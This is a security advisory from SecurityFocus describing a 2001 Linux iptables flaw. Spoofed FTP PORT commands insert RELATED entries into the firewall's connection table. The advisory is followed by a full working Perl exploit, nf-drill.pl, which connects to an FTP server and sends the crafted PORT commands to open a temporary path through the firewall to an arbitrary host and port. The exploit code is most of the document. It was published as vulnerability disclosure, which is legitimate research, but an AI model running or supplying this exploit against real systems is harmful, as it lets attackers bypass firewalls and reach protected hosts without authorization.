source: http://www.securityfocus.com/bid/2602/info

The Linux kernel includes a built-in firewall implementation called IPTables. IPTables supports stateful inspection of several application protocols, one of which is FTP. The inspection is used to facilitate outgoing PORT connections for FTP data transfers when clients or servers are behind firewalls.

When a FTP PORT command containing an IP address which differs from the client's is processed by the stateful-inspection module, the occurrance is caught. Despite being detected, the condition is handled erroneously causing an entry for the PORT connection to be inserted into the table of 'RELATED' connections. This temporarily permits traffic through the firewall from the FTP server to the destination included in the PORT command.

An attacker may be able to use this vulnerability to access unauthorized hosts from the FTP server.

It should be noted that clients do not need to authenticate to exploit this vulnerability. 

#!/usr/bin/perl
#
# nf-drill.pl --- "Drill" holes open in Linux iptables connection table
# Author: Cristiano Lincoln Mattos <lincoln@cesar.org.br>, 2001
# 
# Advisory: http://www.tempest.com.br/advisories/linux-iptables
# 
#      Tempest Security Technologies - a business unit of:
#    CESAR - Centro de Estudos e Sistemas Avancados do Recife
#
# This code is licensed under the GPL.
#

use Socket;
use Getopt::Long;
use strict;

# Option variables
my $server;
my $serverport = 21;
my $host;
my $port;
my $verbose = 0;

# Print function
sub out {
	my ($level,$text) = @_;
	if (!$level || ($level && $verbose)) { print "$text"; }
}

my $opt = GetOptions("server=s" => \$server,
		     "serverport=s" => \$serverport,
		     "host=s" => \$host,
		     "port=i" => \$port,
		     "verbose" => \$verbose);

if ($server eq "" || $host eq "" || $port eq "" || $port < 0 || $port > 65535) {
	print "Usage: $0 --server <ftp> [--serverport <port>] --host <target> --port <port> [--verbose]\n";
	print "   - server: specifies the FTP server (IP or hostname) to connect to\n";
	print "   - serverport: specifies the port of the FTP server -- default: 21\n";
	print "   - host: the IP of the target to open in the connection table\n";
	print "   - port: the port of the target to open in the connection table\n";
	print "   - verbose: sets verbose mode\n";
	exit(0);
}

print "\n nf-blast.pl -- Cristiano Lincoln Mattos <lincoln\@cesar.org.br>, 2001\n";
print " Tempest Security Technologies\n\n";

# For the meanwhile, expecting an IP
my @ip = split(/\./,$host);
my $str = "PORT " . $ip[0] . "," . $ip[1] . "," . $ip[2] . "," . $ip[3] . "," . ($port >> 8) . "," . ($port % 256) . "\r\n";

# Socket init
my $ipn = inet_aton($server);
if (!$ipn) {
	out(0," Error: could not convert $server\n");
	exit(0);
}

my $sin = sockaddr_in($serverport,$ipn);
socket(Sock,PF_INET,SOCK_STREAM,6);

if (!connect(Sock,$sin)) {
	out(0," Error: could not connect to $server:$serverport.\n");
	exit(0);
}
out(0," - Connected to $server:$serverport\n");

my $buf;
recv(Sock,$buf,120,0); chomp($buf);
out(1," - RECV: $buf\n");

# First send a dummy one, just to establish the connection in the iptables logic
send(Sock,$str,0);
out(1," - SEND: $str");
recv(Sock,$buf,120,0); chomp($buf);
out(1," - RECV: $buf\n");

# Now, send the one that will insert itself into the connection table
send(Sock,$str,0);
out(1," - SEND: $str");
recv(Sock,$buf,120,0); chomp($buf);
out(1," - RECV: $buf\n");

out(0," * $server should now be able to connect to $host on port $port ! (for the next 10 seconds)\n");
out(0," - Closing connection to $server:$serverport.\n\n");
close(Sock);




